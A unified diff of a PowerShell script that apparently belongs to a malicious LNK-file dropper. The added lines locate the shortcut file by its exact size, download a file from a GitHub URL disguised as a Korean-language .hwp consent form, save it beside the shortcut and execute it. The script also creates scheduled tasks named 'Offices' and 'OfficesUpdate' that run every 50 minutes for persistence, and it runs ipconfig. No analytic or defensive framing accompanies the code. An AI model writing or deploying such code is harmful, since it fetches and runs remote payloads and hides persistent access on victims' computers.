@@ -1,8 +1,8 @@
-$lk=ls -Path '.\' ^| Where {$_.length -eq 87629};
-if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 ^| Where {$_.length -eq 87629}};
+$lk=ls -Path '.\' | Where {$_.length -eq 87629};
+if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 87629}};
 sc -path 'C:\Users\user\Downloads\1.txt' $lk
-if($lk -ne $null ){$oP=$lk.name.Replace('.lnk','$ext');
-$rl='https://github.com/stand-h/old/blob/main/%EA%B0%9C%EC%9D%B8%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%EC%9D%B4%EC%9A%A9%20%EB%8F%99%EC%9D%98%EC%84%9C(%EC%96%91%EC%8B%9D).hwp';(New-Object System.Net.WebClient).DownloadFile($rl, $oP);&$oP}
+if($lk -ne $null ){$oP=$lk.fullname.Replace('.lnk','.hwp');
+$rl='https://github.com/stand-h/old/blob/main/1.hwp';(New-Object System.Net.WebClient).DownloadFile($rl, $oP);&$oP}
 
 
 ######  VB File  #####
@@ -44,6 +44,7 @@ schtasks /create /tn "Offices" /sc minute /st $st /tr $ws /mo 50 /F
 schtasks /create /tn "OfficesUpdate" /sc minute /st $st1 /tr $ws1 /mo 50 /F
 
 ipconfig
+
 
 
 
